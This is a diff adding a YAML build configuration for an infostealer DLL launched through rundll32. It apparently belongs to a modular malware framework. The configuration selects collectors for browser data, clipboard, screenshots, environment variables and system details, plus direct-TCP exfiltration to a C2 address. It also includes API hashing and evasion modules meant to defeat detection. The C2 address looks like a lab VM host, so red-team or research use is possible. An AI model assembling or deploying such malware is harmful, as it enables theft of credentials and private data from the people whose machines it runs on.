@@ -1,0 +1,33 @@
+name: infostealer_rundll
+description: Infostealer as rundll32-compatible DLL — runs via rundll32.exe payload.dll,RunPayload
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/system_info
+  - collectors/processes
+  - collectors/installed_software
+  - collectors/env_vars
+  - collectors/clipboard
+  - collectors/browser_chromium
+  - collectors/screenshot
+
+exfil: exfil/tcp_direct
+arch: arch/dll_rundll
+def_file: rundll.def
+
+api_resolve: api_resolve/api_hash_djb2
+
+resources: true
+
+evasion:
+  - evasion/entropy_pad
+  - evasion/iat_pad
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
